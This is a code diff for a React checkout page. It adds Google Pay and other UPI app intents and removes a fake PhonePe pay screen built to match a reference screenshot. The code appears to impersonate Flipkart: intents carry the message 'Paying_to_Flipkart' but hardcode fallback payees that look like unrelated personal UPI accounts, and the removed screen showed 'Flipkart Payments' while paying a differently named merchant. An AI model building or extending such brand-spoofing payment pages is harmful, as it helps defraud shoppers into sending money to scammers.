@@ -403,6 +403,7 @@ function PaymentPageContent({ params }: { params: Promise<{ id: string }> }) {
   const [txnid, setTxnid] = useState("");
   const [paytmIntent, setPaytmIntent] = useState("");
   const [phonepeIntent, setPhonepeIntent] = useState("");
+  const [gpayIntent, setGpayIntent] = useState("");
   const [qrCodeUrl, setQrCodeUrl] = useState("");
   const [upiUrl, setUpiUrl] = useState("");
 
@@ -604,6 +605,7 @@ function PaymentPageContent({ params }: { params: Promise<{ id: string }> }) {
           if (t.success) {
             setPaytmIntent(t.paytmIntent);
             setPhonepeIntent(t.phonepeIntent);
+            setGpayIntent(t.gpayIntent);
             setQrCodeUrl(t.qrCodeUrl);
             setUpiUrl(t.upiUrl);
             if (t.upiId) setUpiId(t.upiId);
@@ -645,6 +647,7 @@ function PaymentPageContent({ params }: { params: Promise<{ id: string }> }) {
         setTxnid(t.txnid);
         setPaytmIntent(t.paytmIntent);
         setPhonepeIntent(t.phonepeIntent);
+        setGpayIntent(t.gpayIntent);
         setQrCodeUrl(t.qrCodeUrl);
         setUpiUrl(t.upiUrl);
         if (t.upiId) setUpiId(t.upiId);
@@ -747,11 +750,17 @@ function PaymentPageContent({ params }: { params: Promise<{ id: string }> }) {
   }, []);
 
   const handleAppPay = useCallback((app: string) => {
+    let intent = "";
     if (app === "phonepe") {
-      setActivePayScreen('phonepe');
-      return;
+      intent = phonepeIntent || `phonepe://pay?ver=01&mode=19&pa=${upiId || 'paytm.s27z8uz@pty'}&pn=Paying_to_Flipkart&tr=${txnid}&cu=INR&mc=7446&qrMedium=04&tn=Paying_to_Flipkart&am=${selling}`;
+    } else if (app === "paytm") {
+      intent = paytmIntent || `paytmmp://cash_wallet?pa=${upiId || 'paytm.s27z8uz@pty'}&pn=Paying_to_Flipkart&mc=3526&tr=${txnid}&am=${selling}&cu=INR&tn=Recharge&url=&mode=02&purpose=00&orgid=37567`;
+    } else if (app === "gpay") {
+      intent = gpayIntent || `tez://upi/pay?pa=${upiId || 'paytm.s27z8uz@pty'}&pn=Paying_to_Flipkart&mc=3526&tr=${txnid}&am=${selling}&cu=INR&tn=Recharge`;
+    } else {
+      intent = upiUrl || `upi://pay?pa=${upiId || 'paytm.s27z8uz@pty'}&pn=Paying_to_Flipkart&am=${selling}&cu=INR`;
     }
-    const intent = paytmIntent;
+
     if (intent) {
       setActiveVerificationApp(app);
       
@@ -766,7 +775,7 @@ function PaymentPageContent({ params }: { params: Promise<{ id: string }> }) {
 
       setTimeout(() => launchIntent(intent), 50);
     }
-  }, [paytmIntent, launchIntent, txnid]);
+  }, [phonepeIntent, paytmIntent, gpayIntent, upiUrl, upiId, selling, launchIntent, txnid]);
 
   const handleOpenAgain = useCallback(() => {
     if (!activeVerificationApp) return;
@@ -1200,7 +1209,52 @@ function PaymentPageContent({ params }: { params: Promise<{ id: string }> }) {
             )}
           </div>
 
-          {/* 3. Scan QR Code Row */}
+          {/* 3. Google Pay Row */}
+          <div
+            onClick={() => setSelectedMethod('gpay')}
+            className={`w-full p-3.5 flex flex-col cursor-pointer select-none transition-all ${
+              selectedMethod === 'gpay' ? 'bg-[#f4f8ff]' : 'bg-white hover:bg-slate-50'
+            }`}
+          >
+            <div className="flex items-center justify-between w-full">
+              {/* Left Side: Radio Circle + Name */}
+              <div className="flex items-center gap-3">
+                <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center shrink-0 transition-all ${
+                  selectedMethod === 'gpay' ? "border-[#2874f0] bg-[#2874f0]" : "border-slate-400 bg-white"
+                }`}>
+                  {selectedMethod === 'gpay' && (
+                    <div className="w-2 h-2 rounded-full bg-white" />
+                  )}
+                </div>
+                <span className="text-[15px] font-bold text-[#111827]">Google Pay</span>
+              </div>
+
+              {/* Right Side: App Logo Icon */}
+              <div className="w-7 h-7 rounded-md bg-white border border-slate-200 flex items-center justify-center shrink-0 p-0.5">
+                <img 
+                  src="https://upload.wikimedia.org/wikipedia/commons/f/f2/Google_Pay_%28GPay%29_Logo.svg" 
+                  alt="Google Pay" 
+                  className="h-full w-full object-contain" 
+                />
+              </div>
+            </div>
+
+            {/* Yellow Pay Button Underneath */}
+            {selectedMethod === 'gpay' && (
+              <button
+                type="button"
+                onClick={(e) => {
+                  e.stopPropagation();
+                  handleAppPay('gpay');
+                }}
+                className="w-full mt-3 py-2.5 px-4 rounded-lg font-bold text-[14.5px] text-[#000000] bg-[#ffc200] hover:bg-[#ffb700] active:scale-[0.98] transition-all shadow-xs flex items-center justify-center cursor-pointer border border-[#e5ad00]"
+              >
+                Pay ₹{selling.toLocaleString('en-IN')}
+              </button>
+            )}
+          </div>
+
+          {/* 4. Scan QR Code Row */}
           <div
             onClick={() => setSelectedMethod(o.QR)}
             className={`w-full p-3.5 flex flex-col cursor-pointer select-none transition-all ${
@@ -1320,85 +1374,7 @@ function PaymentPageContent({ params }: { params: Promise<{ id: string }> }) {
 
 
 
-      {/* PhonePe Simulated Pay Screen Page (100% Matching User Reference Screenshot) */}
-      {activePayScreen === 'phonepe' && (
-        <div className="fixed inset-0 z-[2000] bg-white flex flex-col justify-between font-sans select-none animate-in fade-in duration-200">
-          <div>
-            {/* PhonePe Header */}
-            <div className="bg-white px-4 py-3.5 flex items-center justify-between border-b border-slate-100 text-slate-900">
-              <button 
-                type="button" 
-                onClick={() => setActivePayScreen('select')}
-                className="text-slate-800 p-1 -ml-1 hover:bg-slate-100 rounded-full transition-colors cursor-pointer"
-              >
-                <ArrowLeft className="h-6 w-6 stroke-[2.2]" />
-              </button>
-              <h2 className="text-[17px] font-extrabold text-slate-900 font-sans tracking-tight">Pay</h2>
-              <div className="w-7 h-7 rounded-full border border-slate-300 flex items-center justify-center text-slate-700 text-sm font-bold">
-                ?
-              </div>
-            </div>
 
-            {/* Payee Info & Main Card */}
-            <div className="max-w-md mx-auto p-4 space-y-4">
-              <div className="bg-white rounded-2xl p-5 border border-slate-200/80 shadow-2xs space-y-4">
-                
-                {/* Payee Avatar & Info matching reference screenshot */}
-                <div className="flex items-center gap-3.5">
-                  <div className="h-12 w-12 rounded-full bg-[#795548] text-white flex items-center justify-center font-bold text-xl shrink-0 shadow-2xs">
-                    F
-                  </div>
-                  <span className="text-[17px] font-bold text-slate-900 leading-tight">
-                    Flipkart Payments
-                  </span>
-                </div>
-
-                {/* Amount Container */}
-                <div className="bg-[#f2f3f7] rounded-xl p-4 text-left">
-                  <span className="text-2xl font-black text-slate-900">
-                    ₹ {selling}
-                  </span>
-                </div>
-
-                {/* Message Box (Red Box in Reference Screenshot) */}
-                <div className="bg-[#f2f3f7] rounded-xl p-4 text-left space-y-1">
-                  <span className="text-xs text-[#6b7280] font-medium block">Message</span>
-                  <span className="text-sm font-semibold text-[#374151] block">Paying_to_Flipkart</span>
-                </div>
-
-                {/* Disclaimer Text (Red Box in Reference Screenshot) */}
-                <p className="text-xs text-[#4b5563] font-normal leading-relaxed text-left pt-1">
-                  On tapping Pay, money will be deducted from the selected payment mode.
-                </p>
-
-              </div>
-            </div>
-          </div>
-
-          {/* Bottom Purple Proceed To Pay Button */}
-          <div className="p-4 bg-white border-t border-slate-200 sticky bottom-0 z-10">
-            <button
-              type="button"
-              onClick={() => {
-                if (txnid) {
-                  fetch('/api/payments/open-upi', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ txnid, app: 'phonepe' })
-                  }).catch(err => console.error('Failed to register upi application open:', err));
-                }
-                const intent = phonepeIntent || `upi://pay?pa=${upiId || 'guruchaudhary@ptyes'}&pn=${encodeURIComponent(merchantName || 'Ankur Janmeda')}&am=${selling}&cu=INR&tn=${encodeURIComponent('Paying_to_Flipkart')}`;
-                launchIntent(intent);
-                setActivePayScreen('select');
-                setActiveVerificationApp('phonepe');
-              }}
-              className="w-full py-4 bg-[#5f259f] hover:bg-[#521e8a] active:scale-[0.98] text-white rounded-xl text-sm font-extrabold tracking-wide shadow-md transition-all uppercase cursor-pointer"
-            >
-              Proceed To Pay
-            </button>
-          </div>
-        </div>
-      )}
 
       {/* Polling / App Intent Verification Modal Overlay (Hidden) */}
       {false && activePayScreen === 'select' && activeVerificationApp && (
